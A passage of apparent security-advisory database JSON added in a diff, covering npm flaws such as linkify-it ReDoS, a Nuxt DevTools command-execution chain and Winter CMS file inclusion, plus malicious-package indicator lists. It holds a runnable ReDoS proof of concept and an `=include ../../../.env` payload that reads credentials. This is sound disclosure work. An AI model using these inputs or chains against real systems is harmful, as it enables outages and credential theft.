confirmed)\n\n```bash\nnpm install markdown-it@14.1.1\nnode -e \"\n  const md = require('markdown-it')({ linkify: true })\n  for (const n of [1000, 2000, 4000, 8000]) {\n    const evil = 'a@b.com '.repeat(n)\n    const t0 = process.hrtime.bigint()\n    md.render(evil)\n    const ms = Number(process.hrtime.bigint() - t0) / 1e6\n    console.log('n=' + n + ' bytes=' + evil.length + ' md.render=' + ms.toFixed(0) + 'ms')\n  }\n\"\n```\n\n```\nn=1000 bytes=8000   md.render=45ms\nn=2000 bytes=16000  md.render=171ms\nn=4000 bytes=32000  md.render=672ms\nn=8000 bytes=64000  md.render=2636ms\n```\n\nSame quadratic curve. 64 KB is enough to burn 2.6 s in `markdown-it.render()`.\n\n## Impact\n\n- **Availability (High)**: A single HTTP request containing tens of KB of repeated email-like strings blocks one worker thread for seconds to tens of seconds. Under moderate concurrency (10-50 requests), the entire rendering tier of an affected service is wedged.\n- No confidentiality or integrity impact.\n\n**Real-world scenario**: Any service that renders untrusted Markdown with `linkify:true` on the request path — Discourse, Mattermost, GitLab CE, AI chat UIs (Open WebUI, LibreChat), wiki/note apps using markdown-it — receives a post/comment containing 64 KB of `\"a@b.com \"`. The render call blocks the worker for 2.5+ seconds. Scripted at scale, this wedges the rendering tier.\n\n## Suggested remediation\n\nThe fix is algorithmic — convert the outer scan loop to stateful regex iteration so each character is examined a constant number of times:\n\n1. Add the `g` flag to `email_fuzzy`, `link_fuzzy`, `link_no_ip_fuzzy`, `host_fuzzy_test` in `lib/re.mjs`\n2. Rewrite `test()` (or add `testAt(text, pos)`) so fuzzy branches set `re.lastIndex = pos` and call `re.exec(text)` instead of `text.match()`/`text.search()` on a sliced tail\n3. In `match()`, drop `tail = tail.slice(...)` entirely — advance a `pos` offset instead\n\nThe schema branch at `index.mjs:428-440` is already structured this way — it's the in-repo precedent for the fix.\n\n```js\n// proposed sketch\nLinkifyIt.prototype.match = function match (text) {\n  const result = []\n  let pos = 0\n  while (this.testAt(text, pos)) {\n    result.push(createMatch(this, 0))\n    pos = this.__last_index__\n  }\n  return result.length ? result : null\n}\n```\n\nTotal cost becomes O(N): each character scanned at most once per regex across the whole loop.\n\n## Duplicate-risk analysis\n\n- Zero GHSAs on `linkify-it` (`gh api /repos/markdown-it/linkify-it/security-advisories` → `[]`)\n- Zero OSV entries (`api.osv.dev/v1/query` → `{}`)\n- markdown-it's only GHSA (CVE-2022-21670, \"Possible ReDOS in newline rule\") targets markdown-it's own newline regex, not the linkify pipeline\n\nThis finding appears novel.\n\n## Note to maintainers\n\nSince `markdown-it` is the dominant consumer and shares maintainership (Vitaly Puzrin), a patched `linkify-it` release should be paired with a `markdown-it` minor that pins the new minimum version.",
+    "affected": [
+      {
+        "package": {
+          "name": "linkify-it",
+          "ecosystem": "npm",
+          "purl": "pkg:npm/linkify-it"
+        },
+        "ranges": [
+          {
+            "type": "SEMVER",
+            "events": [
+              {
+                "introduced": "0"
+              },
+              {
+                "fixed": "5.0.1"
+              }
+            ]
+          }
+        ],
+        "database_specific": {
+          "last_known_affected_version_range": "<= 5.0.0",
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-22p9-wv53-3rq4/GHSA-22p9-wv53-3rq4.json"
+        }
+      }
+    ],
+    "references": [
+      {
+        "type": "WEB",
+        "url": "https://github.com/markdown-it/linkify-it/security/advisories/GHSA-22p9-wv53-3rq4"
+      },
+      {
+        "type": "PACKAGE",
+        "url": "https://github.com/markdown-it/linkify-it"
+      }
+    ],
+    "database_specific": {
+      "cwe_ids": [
+        "CWE-1333"
+      ],
+      "github_reviewed": true,
+      "github_reviewed_at": "2026-06-26T20:47:58Z",
+      "nvd_published_at": null,
+      "severity": "HIGH"
+    },
+    "severity": [
+      {
+        "type": "CVSS_V4",
+        "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N"
+      }
+    ]
+  },
+  {
+    "schema_version": "1.9.0",
+    "id": "GHSA-22rr-f3p8-5gf8",
+    "published": "2023-09-15T17:12:42Z",
+    "modified": "2023-09-15T17:12:42Z",
+    "summary": "Directus affected by VM2 sandbox escape vulnerability",
+    "details": "### Impact\nIn vm2 for versions up to 3.9.19, Promise handler sanitization can be bypassed, allowing attackers to escape the sandbox and run arbitrary code. Within Directus this applies to the \"Run Script\" operation in flows being able to escape the sandbox running code in the main nodejs context.\n\n### Patches\nPatched in v10.6.0 by replacing `vm2` with `isolated-vm`\n\n### Workarounds\nNone\n\n### References\nhttps://github.com/patriksimek/vm2/security/advisories/GHSA-cchq-frgv-rjh5",
+    "affected": [
+      {
+        "package": {
+          "name": "directus",
+          "ecosystem": "npm",
+          "purl": "pkg:npm/directus"
+        },
+        "ranges": [
+          {
+            "type": "SEMVER",
+            "events": [
+              {
+                "introduced": "0"
+              },
+              {
+                "fixed": "10.6.0"
+              }
+            ]
+          }
+        ],
+        "database_specific": {
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2023/09/GHSA-22rr-f3p8-5gf8/GHSA-22rr-f3p8-5gf8.json"
+        }
+      }
+    ],
+    "references": [
+      {
+        "type": "WEB",
+        "url": "https://github.com/directus/directus/security/advisories/GHSA-22rr-f3p8-5gf8"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/patriksimek/vm2/security/advisories/GHSA-cchq-frgv-rjh5"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/directus/directus/pull/19332"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/directus/directus/commit/284156426fa94f688e8d65a7a4f34f9e6705f058"
+      },
+      {
+        "type": "PACKAGE",
+        "url": "https://github.com/directus/directus"
+      }
+    ],
+    "database_specific": {
+      "cwe_ids": [],
+      "github_reviewed": true,
+      "github_reviewed_at": "2023-09-15T17:12:42Z",
+      "nvd_published_at": null,
+      "severity": "HIGH"
+    },
+    "severity": [
+      {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:H/PR:H/UI:R/S:C/C:H/I:H/A:H"
+      }
+    ]
+  },
+  {
+    "schema_version": "1.9.0",
+    "id": "GHSA-236c-vhj4-gfxg",
+    "published": "2022-05-25T00:00:31Z",
+    "modified": "2026-02-22T22:59:47.461948Z",
+    "withdrawn": "2026-02-17T21:40:20Z",
+    "summary": "Duplicate Advisory: Embedded malware in ua-parser-js",
+    "details": "### Duplicate Advisory\nThis advisory has been withdrawn because it is a duplicate of GHSA-pjwm-rvh2-c87w. This link is maintained to preserve external references.\n\n### Original Description\nA vulnerability was found in ua-parser-js 0.7.29/0.8.0/1.0.0. It has been rated as critical. This issue affects the crypto mining component which introduces a backdoor. Upgrading to version 0.7.30, 0.8.1 and 1.0.1 is able to address this issue. It is recommended to upgrade the affected component.",
+    "affected": [
+      {
+        "package": {
+          "name": "ua-parser-js",
+          "ecosystem": "npm",
+          "purl": "pkg:npm/ua-parser-js"
+        },
+        "ranges": [
+          {
+            "type": "SEMVER",
+            "events": [
+              {
+                "introduced": "0.7.29"
+              },
+              {
+                "fixed": "0.7.30"
+              }
+            ]
+          }
+        ],
+        "versions": [
+          "0.7.29"
+        ],
+        "database_specific": {
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/05/GHSA-236c-vhj4-gfxg/GHSA-236c-vhj4-gfxg.json"
+        }
+      },
+      {
+        "package": {
+          "name": "ua-parser-js",
+          "ecosystem": "npm",
+          "purl": "pkg:npm/ua-parser-js"
+        },
+        "ranges": [
+          {
+            "type": "SEMVER",
+            "events": [
+              {
+                "introduced": "0.8.0"
+              },
+              {
+                "fixed": "0.8.1"
+              }
+            ]
+          }
+        ],
+        "versions": [
+          "0.8.0"
+        ],
+        "database_specific": {
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/05/GHSA-236c-vhj4-gfxg/GHSA-236c-vhj4-gfxg.json"
+        }
+      },
+      {
+        "package": {
+          "name": "ua-parser-js",
+          "ecosystem": "npm",
+          "purl": "pkg:npm/ua-parser-js"
+        },
+        "ranges": [
+          {
+            "type": "SEMVER",
+            "events": [
+              {
+                "introduced": "1.0.0"
+              },
+              {
+                "fixed": "1.0.1"
+              }
+            ]
+          }
+        ],
+        "versions": [
+          "1.0.0"
+        ],
+        "database_specific": {
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/05/GHSA-236c-vhj4-gfxg/GHSA-236c-vhj4-gfxg.json"
+        }
+      }
+    ],
+    "references": [
+      {
+        "type": "ADVISORY",
+        "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-4229"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/faisalman/ua-parser-js/issues/536"
+      },
+      {
+        "type": "ADVISORY",
+        "url": "https://github.com/advisories/GHSA-pjwm-rvh2-c87w"
+      },
+      {
+        "type": "WEB",
+        "url": "https://vuldb.com/?id.185453"
+      }
+    ],
+    "database_specific": {
+      "cwe_ids": [
+        "CWE-829",
+        "CWE-912"
+      ],
+      "github_reviewed": true,
+      "github_reviewed_at": "2026-02-17T21:40:20Z",
+      "nvd_published_at": "2022-05-24T16:15:00Z",
+      "severity": "HIGH"
+    },
+    "severity": [
+      {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"
+      }
+    ]
+  },
+  {
+    "schema_version": "1.9.0",
+    "id": "GHSA-238x-w2j9-gwwr",
+    "published": "2026-10-06T16:18:16Z",
+    "modified": "2026-10-06T16:30:04.323819650Z",
+    "aliases": [
+      "CVE-2026-105849"
+    ],
+    "summary": "Payload vulnerable to API key disclosure through ordinary document reads",
+    "details": "### Impact\n\nUsers with read access to other user documents could access their active API keys. An exposed key grants the target account’s permissions until rotated or disabled.\n\nYou are affected if:\n\n- An authentication collection enables `useAPIKey`.\n- Users have read access to other user documents containing active API keys.\n\n### Patches\n\nUsers should upgrade payload packages to `>= 3.90.0` or `>= 4.0.0-canary.34`.\n\n### Workarounds\n\nDisable `useAPIKey` or restrict users to reading only their own authentication document. Rotate any API key that may have been exposed.",
+    "affected": [
+      {
+        "package": {
+          "name": "payload",
+          "ecosystem": "npm",
+          "purl": "pkg:npm/payload"
+        },
+        "ranges": [
+          {
+            "type": "SEMVER",
+            "events": [
+              {
+                "introduced": "3.0.0"
+              },
+              {
+                "fixed": "3.90.0"
+              }
+            ]
+          }
+        ],
+        "database_specific": {
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-238x-w2j9-gwwr/GHSA-238x-w2j9-gwwr.json"
+        }
+      },
+      {
+        "package": {
+          "name": "payload",
+          "ecosystem": "npm",
+          "purl": "pkg:npm/payload"
+        },
+        "ranges": [
+          {
+            "type": "SEMVER",
+            "events": [
+              {
+                "introduced": "4.0.0-canary.0"
+              },
+              {
+                "fixed": "4.0.0-canary.34"
+              }
+            ]
+          }
+        ],
+        "database_specific": {
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-238x-w2j9-gwwr/GHSA-238x-w2j9-gwwr.json"
+        }
+      }
+    ],
+    "references": [
+      {
+        "type": "WEB",
+        "url": "https://github.com/payloadcms/payload/security/advisories/GHSA-238x-w2j9-gwwr"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/payloadcms/payload/commit/880d2e900be22cd66a9e939f2b3e702fa413180f"
+      },
+      {
+        "type": "PACKAGE",
+        "url": "https://github.com/payloadcms/payload"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/payloadcms/payload/releases/tag/v3.90.0"
+      }
+    ],
+    "database_specific": {
+      "cwe_ids": [
+        "CWE-201",
+        "CWE-862"
+      ],
+      "github_reviewed": true,
+      "github_reviewed_at": "2026-10-06T16:18:16Z",
+      "nvd_published_at": null,
+      "severity": "HIGH"
+    },
+    "severity": [
+      {
+        "type": "CVSS_V4",
+        "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N"
+      }
+    ]
+  },
+  {
+    "schema_version": "1.9.0",
+    "id": "GHSA-23vw-mhv5-grv5",
+    "published": "2020-09-03T15:48:43Z",
+    "modified": "2020-08-31T19:00:56Z",
+    "summary": "Denial of Service in @hapi/hapi",
+    "details": "Versions of `@hapi/hapi` prior to 18.4.1 or 19.1.1 are vulnerable to Denial of Service. The CORS request handler has a vulnerability which will cause the function to throw a system error if the header contains some invalid values. If no unhandled exception handler is available, the application will exist, allowing an attacker to shut down services.\n\n\n## Recommendation\n\nUpgrade to versions 18.4.1, 19.1.1 or later.",
+    "affected": [
+      {
+        "package": {
+          "name": "@hapi/hapi",
+          "ecosystem": "npm",
+          "purl": "pkg:npm/%40hapi/hapi"
+        },
+        "ranges": [
+          {
+            "type": "SEMVER",
+            "events": [
+              {
+                "introduced": "0"
+              },
+              {
+                "fixed": "18.4.1"
+              }
+            ]
+          }
+        ],
+        "database_specific": {
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2020/09/GHSA-23vw-mhv5-grv5/GHSA-23vw-mhv5-grv5.json"
+        }
+      },
+      {
+        "package": {
+          "name": "@hapi/hapi",
+          "ecosystem": "npm",
+          "purl": "pkg:npm/%40hapi/hapi"
+        },
+        "ranges": [
+          {
+            "type": "SEMVER",
+            "events": [
+              {
+                "introduced": "19.0.0"
+              },
+              {
+                "fixed": "19.1.1"
+              }
+            ]
+          }
+        ],
+        "database_specific": {
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2020/09/GHSA-23vw-mhv5-grv5/GHSA-23vw-mhv5-grv5.json"
+        }
+      }
+    ],
+    "references": [
+      {
+        "type": "WEB",
+        "url": "https://www.npmjs.com/advisories/1482"
+      }
+    ],
+    "database_specific": {
+      "cwe_ids": [],
+      "github_reviewed": true,
+      "github_reviewed_at": "2020-08-31T19:00:56Z",
+      "nvd_published_at": null,
+      "severity": "HIGH"
+    }
+  },
+  {
+    "schema_version": "1.9.0",
+    "id": "GHSA-23wx-cgxq-vpwx",
+    "published": "2022-05-03T00:00:45Z",
+    "modified": "2023-11-08T04:08:47.532216Z",
+    "aliases": [
+      "CVE-2022-25645"
+    ],
+    "summary": "Prototype Pollution in dset",
+    "details": "All versions of `dset` prior to 3.1.2 are vulnerable to Prototype Pollution via `dset/merge` mode, as the `dset` function checks for prototype pollution by validating if the top-level path contains `__proto__`, `constructor` or `prototype`. By crafting a malicious object, it is possible to bypass this check and achieve prototype pollution.",
+    "affected": [
+      {
+        "package": {
+          "name": "dset",
+          "ecosystem": "npm",
+          "purl": "pkg:npm/dset"
+        },
+        "ranges": [
+          {
+            "type": "SEMVER",
+            "events": [
+              {
+                "introduced": "0"
+              },
+              {
+                "fixed": "3.1.2"
+              }
+            ]
+          }
+        ],
+        "database_specific": {
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/05/GHSA-23wx-cgxq-vpwx/GHSA-23wx-cgxq-vpwx.json"
+        }
+      },
+      {
+        "package": {
+          "name": "org.webjars.npm:dset",
+          "ecosystem": "Maven",
+          "purl": "pkg:maven/org.webjars.npm/dset"
+        },
+        "ranges": [
+          {
+            "type": "ECOSYSTEM",
+            "events": [
+              {
+                "introduced": "0"
+              },
+              {
+                "fixed": "3.1.2"
+              }
+            ]
+          }
+        ],
+        "versions": [
+          "3.0.0",
+          "3.1.0",
+          "3.1.1"
+        ],
+        "database_specific": {
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/05/GHSA-23wx-cgxq-vpwx/GHSA-23wx-cgxq-vpwx.json"
+        }
+      }
+    ],
+    "references": [
+      {
+        "type": "ADVISORY",
+        "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-25645"
+      },
+      {
+        "type": "PACKAGE",
+        "url": "https://github.com/lukeed/dset"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/lukeed/dset/blob/master/src/merge.js%23L9"
+      },
+      {
+        "type": "WEB",
+        "url": "https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-2431974"
+      },
+      {
+        "type": "WEB",
+        "url": "https://snyk.io/vuln/SNYK-JS-DSET-2330881"
+      }
+    ],
+    "database_specific": {
+      "cwe_ids": [
+        "CWE-1321"
+      ],
+      "github_reviewed": true,
+      "github_reviewed_at": "2022-05-20T20:13:33Z",
+      "nvd_published_at": "2022-05-01T16:15:00Z",
+      "severity": "MODERATE"
+    },
+    "severity": [
+      {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:L"
+      }
+    ]
+  },
+  {
+    "schema_version": "1.9.0",
+    "id": "GHSA-279x-mwfv-vcqv",
+    "published": "2026-08-05T21:27:39Z",
+    "modified": "2026-08-20T05:15:07.135772644Z",
+    "aliases": [
+      "CVE-2026-71319"
+    ],
+    "summary": "Unauthenticated Nuxt DevTools RPC allows arbitrary command execution on the developer's host",
+    "details": "### Impact\n\nNuxt DevTools (development mode only) exposes a bidirectional RPC channel over the Vite HMR WebSocket via the `nuxt:devtools:rpc` plugin. On affected versions the channel has no authentication: any client that can reach the Vite HMR endpoint (`ws://<host>:<port>/`, subprotocol `vite-hmr`) can call RPC methods, with no token, handshake, or origin check before the channel is established. The `updateOptions()`, `clearOptions()`, and `openInEditor()` methods do not enforce the `ensureDevAuthToken` check that the other mutating methods use.\n\n`openInEditor()` reads the persisted `behavior.openInEditor` value and passes it to the `launch-editor` package, which spawns it as a child process. That value is settable through the equally unauthenticated `updateOptions()`. An attacker who can reach the HMR port can therefore chain `updateOptions('behavior', { openInEditor: '<command>' })` then `openInEditor('<any-existing-file>')` to execute an arbitrary program on the developer's machine.\n\nThe HMR port is reachable by a process on the same host, by any peer on the LAN when the dev server is bound with `nuxi dev --host`, or by a malicious website the developer visits while the dev server is running (a browser can open the HMR WebSocket cross-origin). Impact is limited to development environments; production builds do not run DevTools.\n\n### Patches\n\nFixed in `@nuxt/devtools@3.3.1`. Because `nuxt` depends on `@nuxt/devtools` through a `^3.x` range, updating is a lockfile refresh / reinstall; no `nuxt` release is required.\n\n### Workarounds\n\n- Update `@nuxt/devtools` to a patched version.\n- Do not run the dev server bound to a non-loopback interface (`nuxi dev --host`) on an untrusted network.\n- Disable DevTools entirely with `devtools: { enabled: false }` in `nuxt.config`.\n\n### References\n\n- GHSA-279x-mwfv-vcqv\n- `launch-editor`: https://www.npmjs.com/package/launch-editor",
+    "affected": [
+      {
+        "package": {
+          "name": "@nuxt/devtools",
+          "ecosystem": "npm",
+          "purl": "pkg:npm/%40nuxt/devtools"
+        },
+        "ranges": [
+          {
+            "type": "SEMVER",
+            "events": [
+              {
+                "introduced": "0"
+              },
+              {
+                "fixed": "3.3.1"
+              }
+            ]
+          }
+        ],
+        "database_specific": {
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/08/GHSA-279x-mwfv-vcqv/GHSA-279x-mwfv-vcqv.json"
+        }
+      }
+    ],
+    "references": [
+      {
+        "type": "WEB",
+        "url": "https://github.com/nuxt/nuxt/security/advisories/GHSA-279x-mwfv-vcqv"
+      },
+      {
+        "type": "PACKAGE",
+        "url": "https://github.com/nuxt/nuxt"
+      }
+    ],
+    "database_specific": {
+      "cwe_ids": [
+        "CWE-306",
+        "CWE-94"
+      ],
+      "github_reviewed": true,
+      "github_reviewed_at": "2026-08-05T21:27:39Z",
+      "nvd_published_at": null,
+      "severity": "CRITICAL"
+    },
+    "severity": [
+      {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H"
+      }
+    ]
+  },
+  {
+    "schema_version": "1.7.3",
+    "id": "MAL-2021-1",
+    "published": "2021-12-27T00:00:00Z",
+    "modified": "2023-09-01T20:12:58Z",
+    "summary": "Malicious code in cxp-jquery (npm)",
+    "details": "\n---\n_-= Per source details. Do not edit below this line.=-_\n\n## Source: checkmarx (b0e4725a2db5433915386ce19dadd7812b0f44e9afcb7c48d855797cf7a78537)\nMalicious packages campaign since 2021 targeting developers, steals source code and secrets\n",
+    "affected": [
+      {
+        "package": {
+          "name": "cxp-jquery",
+          "ecosystem": "npm",
+          "purl": "pkg:npm/cxp-jquery"
+        },
+        "ranges": [
+          {
+            "type": "SEMVER",
+            "events": [
+              {
+                "introduced": "0"
+              }
+            ]
+          }
+        ],
+        "database_specific": {
+          "source": "https://github.com/ossf/malicious-packages/blob/main/osv/malicious/npm/cxp-jquery/MAL-2021-1.json"
+        }
+      }
+    ],
+    "references": [
+      {
+        "type": "ARTICLE",
+        "url": "https://medium.com/checkmarx-security/an-ongoing-open-source-attack-reveals-roots-dating-back-to-2021-4a511979fd98"
+      }
+    ],
+    "database_specific": {
+      "iocs": {
+        "domains": [
+          "6wxd3v84nevku06dcgbqcxrmt.canarytokens.com",
+          "fhg62xavat9jzyt6euwxi6sro.canarytokens.com",
+          "1wy3rk316x8qqy4fyxtvcs4kkbq2es2h.oastify.com",
+          "288utkkrohmp0nr8znflcp88nztrhg.oastify.com",
+          "bq5m9lnmalh9ktyi9wydockt9kfb32rr.oastify.com",
+          "c7kxnys58daceezcxx0jjstn6ec50vok.oastify.com",
+          "cczk46g2vtc0000k68dgggx31deyyyyyb.oast.fun",
+          "cfrg38n2vtc0000h72xgg8hebweyyyyyb.oast.fun",
+          "cfswk0m2vtc0000myvg0g8h6jocyyyyyb.oast.fun",
+          "cfytrzv2vtc00002v400geytd6yyyyyyn.oast.fun",
+          "ck0r1hp2vtc00007c0zggjocy3ryyyyyb.oast.fun",
+          "ho94479k12fy3mdiwjvzvvo09rfh36.oastify.com",
+          "l2g8zu5qwvsj5bewhvvxusdpp.canarytokens.com",
+          "u3yjt7ui4aa5egu44kdrpys1psvjj97y.oastify.com",
+          "u61eou88vswlvti2yihx8ktyrpxfl4.oastify.com",
+          "unld4fepiyjq4ywsrj7mmpaz3q9hx9ly.oastify.com",
+          "uzx39o3nimx3qp8s14uu6kfjhan1brzg.oastify.com",
+          "yhj0choyrutnbvpcjuesxpph58bzztni.oastify.com",
+          "cup1qnm56sdo4bdv.b.requestbin.net",
+          "4or5o5yn5lqzenk4.b.requestbin.net",
+          "bind9-or-callback-server.com",
+          "efrva6.dnslog.cn",
+          "eozpdddh3tifjo.m.pipedream.net",
+          "marcomayo.com",
+          "nirobtest.xyz",
+          "npmtesttut.com"
+        ],
+        "ips": [
+          "178.128.27.205",
+          "185.62.56.25",
+          "185.62.57.60",
+          "198.199.83.132",
+          "5.9.104.19",
+          "51.250.2.204",
+          "65.21.108.160"
+        ]
+      },
+      "malicious-packages-origins": [
+        {
+          "import_time": "2023-09-04T09:11:41.803226336Z",
+          "modified_time": "2023-09-01T20:12:58Z",
+          "ranges": [
+            {
+              "events": [
+                {
+                  "introduced": "0"
+                }
+              ],
+              "type": "SEMVER"
+            }
+          ],
+          "sha256": "b0e4725a2db5433915386ce19dadd7812b0f44e9afcb7c48d855797cf7a78537",
+          "source": "checkmarx"
+        }
+      ]
+    },
+    "credits": [
+      {
+        "name": "Checkmarx",
+        "contact": [
+          "supplychainsecurity@checkmarx.com",
+          "https://bit.ly/checkmarx-malicious-packages"
+        ],
+        "type": "FINDER"
+      }
+    ]
+  },
+  {
+    "schema_version": "1.7.3",
+    "id": "MAL-2021-2",
+    "published": "2021-12-24T00:00:00Z",
+    "modified": "2023-09-01T20:12:58Z",
+    "summary": "Malicious code in dbp-polyfills (npm)",
+    "details": "\n---\n_-= Per source details. Do not edit below this line.=-_\n\n## Source: checkmarx (4f59dcb33c6b979c2571b136278d2a4dbb77c122506b74f77ed0bc422fed824a)\nMalicious packages campaign since 2021 targeting developers, steals source code and secrets\n",
+    "affected": [
+      {
+        "package": {
+          "name": "dbp-polyfills",
+          "ecosystem": "npm",
+          "purl": "pkg:npm/dbp-polyfills"
+        },
+        "ranges": [
+          {
+            "type": "SEMVER",
+            "events": [
+              {
+                "introduced": "0"
+              }
+            ]
+          }
+        ],
+        "database_specific": {
+          "source": "https://github.com/ossf/malicious-packages/blob/main/osv/malicious/npm/dbp-polyfills/MAL-2021-2.json"
+        }
+      }
+    ],
+    "references": [
+      {
+        "type": "ARTICLE",
+        "url": "https://medium.com/checkmarx-security/an-ongoing-open-source-attack-reveals-roots-dating-back-to-2021-4a511979fd98"
+      }
+    ],
+    "database_specific": {
+      "iocs": {
+        "domains": [
+          "6wxd3v84nevku06dcgbqcxrmt.canarytokens.com",
+          "fhg62xavat9jzyt6euwxi6sro.canarytokens.com",
+          "1wy3rk316x8qqy4fyxtvcs4kkbq2es2h.oastify.com",
+          "288utkkrohmp0nr8znflcp88nztrhg.oastify.com",
+          "bq5m9lnmalh9ktyi9wydockt9kfb32rr.oastify.com",
+          "c7kxnys58daceezcxx0jjstn6ec50vok.oastify.com",
+          "cczk46g2vtc0000k68dgggx31deyyyyyb.oast.fun",
+          "cfrg38n2vtc0000h72xgg8hebweyyyyyb.oast.fun",
+          "cfswk0m2vtc0000myvg0g8h6jocyyyyyb.oast.fun",
+          "cfytrzv2vtc00002v400geytd6yyyyyyn.oast.fun",
+          "ck0r1hp2vtc00007c0zggjocy3ryyyyyb.oast.fun",
+          "ho94479k12fy3mdiwjvzvvo09rfh36.oastify.com",
+          "l2g8zu5qwvsj5bewhvvxusdpp.canarytokens.com",
+          "u3yjt7ui4aa5egu44kdrpys1psvjj97y.oastify.com",
+          "u61eou88vswlvti2yihx8ktyrpxfl4.oastify.com",
+          "unld4fepiyjq4ywsrj7mmpaz3q9hx9ly.oastify.com",
+          "uzx39o3nimx3qp8s14uu6kfjhan1brzg.oastify.com",
+          "yhj0choyrutnbvpcjuesxpph58bzztni.oastify.com",
+          "cup1qnm56sdo4bdv.b.requestbin.net",
+          "4or5o5yn5lqzenk4.b.requestbin.net",
+          "bind9-or-callback-server.com",
+          "efrva6.dnslog.cn",
+          "eozpdddh3tifjo.m.pipedream.net",
+          "marcomayo.com",
+          "nirobtest.xyz",
+          "npmtesttut.com"
+        ],
+        "ips": [
+          "178.128.27.205",
+          "185.62.56.25",
+          "185.62.57.60",
+          "198.199.83.132",
+          "5.9.104.19",
+          "51.250.2.204",
+          "65.21.108.160"
+        ]
+      },
+      "malicious-packages-origins": [
+        {
+          "import_time": "2023-09-04T09:11:41.804044673Z",
+          "modified_time": "2023-09-01T20:12:58Z",
+          "ranges": [
+            {
+              "events": [
+                {
+                  "introduced": "0"
+                }
+              ],
+              "type": "SEMVER"
+            }
+          ],
+          "sha256": "4f59dcb33c6b979c2571b136278d2a4dbb77c122506b74f77ed0bc422fed824a",
+          "source": "checkmarx"
+        }
+      ]
+    },
+    "credits": [
+      {
+        "name": "Checkmarx",
+        "contact": [
+          "supplychainsecurity@checkmarx.com",
+          "https://bit.ly/checkmarx-malicious-packages"
+        ],
+        "type": "FINDER"
+      }
+    ]
+  },
+  {
+    "schema_version": "1.9.0",
+    "id": "GHSA-2223-f22x-24cq",
+    "published": "2026-08-20T18:44:17Z",
+    "modified": "2026-08-27T04:10:43.089917341Z",
+    "aliases": [
+      "CVE-2026-79773"
+    ],
+    "summary": "Winter: Local File Inclusion through =include directives in JavaScript asset compilation",
+    "details": "### Impact\n\nAffected versions of Winter CMS allow authenticated backend users with the `cms.manage_assets` permission (\"Manage website assets - images, JavaScript files, CSS files\") to disclose arbitrary files readable by the PHP process by placing an `=include` / `=require` directive in a theme JavaScript asset.\n\n`Winter\\Storm\\Parse\\Assetic\\Filter\\JavascriptImporter` processes `=include` / `=require` directives found in comment blocks of JavaScript assets passed through `System\\Classes\\CombineAssets`. The directive target was resolved relative to the including file's own directory with `realpath()` and inlined into the combined output with no confinement check, so a directive such as `=include ../../../.env` escaped the theme's asset tree and inlined an arbitrary server-readable file. The only restriction was that the target had to have a file extension, since extension-less names had `.js` appended to them.\n\nBecause the combined output is served through the `combine/{file}` route, which performs no authentication or authorization checks, the disclosed contents then became readable by **unauthenticated** visitors at a stable URL as soon as the asset was referenced by any template.\n\nThe leaked content includes any file the web process can read, most importantly the application `.env` file (disclosing `APP_KEY` and database credentials). Text files were disclosed intact; binary content was mangled by the minification pipeline.\n\nThis is the JavaScript-importer counterpart of GHSA-58fp-mcx6-7qf9 (Local File Inclusion through LESS `@import` directives) and of CVE-2023-52085 / GHSA-2x7r-93ww-cxrq — the same vulnerability class reached through a different asset combiner filter.\n\nTo actively exploit this issue, an attacker would need an authenticated backend account with the `cms.manage_assets` permission. By default this permission is assigned to the built-in Developer role. The Winter CMS maintainers strongly recommend that the `cms.manage_assets` permission only be reserved to trusted administrators and developers in general, as it grants direct write access to files that are combined and served publicly.\n\n### Patches\n\n`JavascriptImporter` in [Winter Storm](https://github.com/wintercms/storm) now applies two independent gates to every `=include` / `=require` target:\n\n1. Only `.js` targets may be inlined. Any other extension is rejected before path resolution, which neutralises disclosure of non-JavaScript server files such as `.env`, `.php`, and `.log`. Extension-less includes are unaffected, as they are resolved to `.js` before this check, exactly as before.\n2. The resolved path must lie within the including file's own directory subtree or one of the caller-configured allowed import roots, enforced through the new `PathResolver::withinAny()` helper. A rejected include emits a comment in place of the file contents (or throws, if the directive was `=require`).\n\nThe allowed-roots configuration is now shared between the JavaScript importer and the LESS compiler through a `HasAllowedImportRoots` trait, and `System\\Classes\\CombineAssets` configures both — along with the CSS `@import` filter, using the import validator added in `assetic/framework` v3.2.1 — with `themes_path()`, `plugins_path()`, and `base_path('modules')` as the allowed roots. This preserves the cross-tree imports that shipped themes and plugins legitimately use (e.g. a plugin asset importing a module asset) while confining everything else.\n\nThe backend permission descriptions for `cms.manage_assets` and `cms.manage_content` now also carry the same \"should only be given to trusted users\" warning that was already displayed for 